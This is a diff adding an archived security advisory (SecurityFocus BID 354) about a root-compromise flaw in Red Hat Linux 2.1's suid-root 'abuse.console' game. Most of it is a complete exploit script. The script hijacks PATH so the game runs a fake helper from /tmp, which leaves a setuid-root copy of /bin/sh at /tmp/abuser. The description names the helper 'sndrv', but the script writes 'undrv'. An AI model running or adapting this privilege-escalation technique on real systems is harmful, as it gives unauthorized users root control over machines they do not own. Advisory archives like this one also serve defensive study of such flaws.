@@ -1,0 +1,75 @@
+source: http://www.securityfocus.com/bid/354/info
+
+Abuse is a game that is included with RedHat Linux 2.1 in the games package. The console version, abuse.console, is suid-root and will load the program sndrv as root without checking for an absolute pathname. This means that sndrv can be substituted in another directory by a regular user and used to locally execute arbitrary code on the target machine. Consequences are a root compromise. 
+
+Exploit:
+
+#!/bin/sh
+
+#
+
+# abuser.sh
+
+# exploits a security hole in abuse to create
+
+# a suid root shell /tmp/abuser on a linux
+
+# Red Hat 2.1 system with the games package
+
+# installed.
+
+#
+
+# by Dave M. (davem@cmu.edu)
+
+#
+
+echo ================ abuser.sh - gain root on Linux Red Hat 2.1 system
+
+echo ================ Checking system vulnerability
+
+if test -u /usr/lib/games/abuse/abuse.console
+
+then
+
+echo ++++++++++++++++ System appears vulnerable.
+
+cd /tmp
+
+cat << _EOF_ > /tmp/undrv
+
+#!/bin/sh
+
+/bin/cp /bin/sh /tmp/abuser
+
+/bin/chmod 4777 /tmp/abuser
+
+_EOF_
+
+chmod +x /tmp/undrv
+
+PATH=/tmp
+
+echo ================ Executing Abuse
+
+/usr/lib/games/abuse/abuse.console
+
+/bin/rm /tmp/undrv
+
+if test -u /tmp/abuser
+
+then
+
+echo ++++++++++++++++ Exploit successful, suid shell located in /tmp/abuser
+
+else
+
+echo ---------------- Exploit failed
+
+fi
+
+else
+
+echo ---------------- This machine does not appear to be vulnerable.
+
+fi 
